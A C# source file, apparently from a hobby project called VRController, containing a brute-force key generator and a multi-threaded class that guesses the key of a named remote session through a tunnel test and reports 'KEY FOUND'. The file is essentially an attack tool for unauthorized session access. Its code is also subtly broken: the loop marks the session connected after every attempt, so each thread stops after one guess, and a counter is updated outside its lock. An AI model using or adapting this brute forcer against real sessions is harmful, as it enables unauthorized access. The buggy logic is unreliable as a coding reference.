using System.Collections.Generic;
using System.Threading;

namespace VRController
{
    /// <summary>
    ///     a bruteforce program
    /// </summary>
    public class BruteForce
    {
        public char[] CharList =
        {
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
            'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
            'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
            'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
        };

        public List<int> IntList = new List<int> {0};

        private int IntPasswordsGenerated;

        /// <summary>
        ///     generate the next bruteforce try
        /// </summary>
        /// <returns>returns a string</returns>
        public string GenerateString()
        {
            var Number = IntList.Count - 1;

            IntPasswordsGenerated++;
            if (IntPasswordsGenerated == 1) return CharList[0].ToString();
            lock (IntList)
            {
                do
                {
                    IntList[Number]++;
                    if ((IntList[Number] == CharList.Length) && (Number == 0))
                    {
                        IntList[Number] = 0;
                        IntList.Add(0);
                        break;
                    }

                    if (IntList[Number] == CharList.Length)
                    {
                        IntList[Number] = 0;
                        Number--;
                    }
                    else
                    {
                        break;
                    }
                } while (true);

                var BruteForceString = string.Empty;

                foreach (var CurrentInt in IntList) BruteForceString += CharList[CurrentInt];

                return BruteForceString;
            }
        }

        /// <summary>
        ///     Stolen from internet
        /// </summary>
        /// <returns></returns>
        public int PasswordsGenerated()
        {
            return IntPasswordsGenerated;
        }
    }

    internal class VRBruteForcer
    {
        private readonly BruteForce bruteForce;

        private readonly string session;

        private readonly VRConnector vr;

        private bool sessionConnected;

        private int threads;

        /// <summary>
        ///     a bruteforcer specific for the VR
        /// </summary>
        /// <param name="vrConnector"></param>
        /// <param name="bruteForce"></param>
        /// <param name="session"></param>
        /// <param name="threads"></param>
        public VRBruteForcer(VRConnector vrConnector, BruteForce bruteForce, string session, int threads = 10)
        {
            this.bruteForce = bruteForce;
            vr = vrConnector;
            this.threads = threads;
            this.session = session;
            for (var i = 0; i < threads; i++) new Thread(tryNextKey).Start();
        }

        /// <summary>
        ///     try the next key
        /// </summary>
        public void tryNextKey()
        {
            string key;
            while (!sessionConnected)
            {
                key = bruteForce.GenerateString();
                if (bruteForce.PasswordsGenerated()%100 == 0)
                    vr.write("TRYING KEY:" + key + ": " + bruteForce.PasswordsGenerated());
                if (vr.testTunnel(session, key))
                {
                    sessionConnected = true;
                    vr.write("KEY FOUND FOR SESSION : " + session);
                    vr.write(key + " !!!!");
                }
                sessionConnected = true;
            }
        }
    }
}